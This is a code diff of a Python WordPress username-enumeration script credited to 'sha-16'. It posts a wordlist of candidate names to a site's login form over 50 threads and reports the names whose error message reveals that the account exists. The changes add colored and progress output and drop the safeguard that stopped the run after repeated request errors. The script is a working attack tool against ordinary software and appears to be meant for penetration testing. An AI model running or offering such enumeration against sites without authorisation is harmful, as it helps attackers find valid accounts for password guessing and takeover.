@@ -2,6 +2,7 @@
 
 import requests, sys 
 from concurrent.futures import ThreadPoolExecutor
+from termcolor import colored
 from pwn import *
 
 # WORDPRESS USER ENUM
@@ -11,14 +12,14 @@ from pwn import *
 
 
 def banner():
-    print(
+    print(colored(
 """
  __      ___ __        _   _ ___  ___ _ __       ___ _ __  _   _ _ __ ___  
  \ \ /\ / / '_ \ _____| | | / __|/ _ \ '__|____ / _ \ '_ \| | | | '_ ` _ \ 
   \ V  V /| |_) |_____| |_| \__ \  __/ | |_____|  __/ | | | |_| | | | | | | 
    \_/\_/ | .__/       \__,_|___/\___|_|        \___|_| |_|\__,_|_| |_| |_| (by sha-16)
           |_|                                                              
-""")
+""", 'blue'))
 
 ##########################################################################################
 
@@ -38,8 +39,6 @@ def check_wordlist(dic):
     
 ##########################################################################################
 
-requests_errors = 0
-string_checker = "The password you entered for the username"
 
 def makeRequests(user): 
 
@@ -51,17 +50,16 @@ def makeRequests(user):
 
     try:
         r = requests.post(url, data=data)
+
+        user_to_test.status(user)
         
-        if string_checker in r.text:
-            print(f"> {user}") 
-
+        if "The password you entered for the username" in r.text:
+            print(colored(f"* {user}", 'green')) 
+            
     except:
-        global requests_errors
-        requests_errors += 1
-        if requests_errors == 10:
-            print('\n[!] Error: there are too many errors with requests, please check if your target is up!')
-            os._exit(2)
+        pass
 
+        
 ##########################################################################################
 
 if __name__ == '__main__':
@@ -80,20 +78,21 @@ if __name__ == '__main__':
                 for word in wordlist:  
                     dictionary.append(word.rstrip())
 
-                print("="*70)
-                print(f"STARTING USER ENUMERATION...")
-                print("="*70)
-                print(f"[+] URL: {url}")
-                print(f"[+] DICTIONARY: {dic}")
-                print("="*70)
-                print("[*] USERS FOUND:")
-                print("-"*70)
+
+                log.progress('Starting user enumeration...')
+                
+                print(colored("-"*70, 'red'))
+                print(colored("[+]", 'blue') +  f" Url: {url}")
+                print(colored("[+]", 'blue') + f" Dictionary: {dic}")
+                print(colored("-"*70, 'red'))
 
                 with ThreadPoolExecutor(max_workers=50) as executor: 
+                    user_to_test =  log.progress('Testing')
                     results = executor.map(makeRequests, dictionary)
     
-                print("-"*70)
-                print("FINISHED...!")
+                print(colored("-"*70, 'red'))
+                print("Finished...!")
+                print(colored("-"*70, 'red'))
                 sys.exit(0)
 
                 
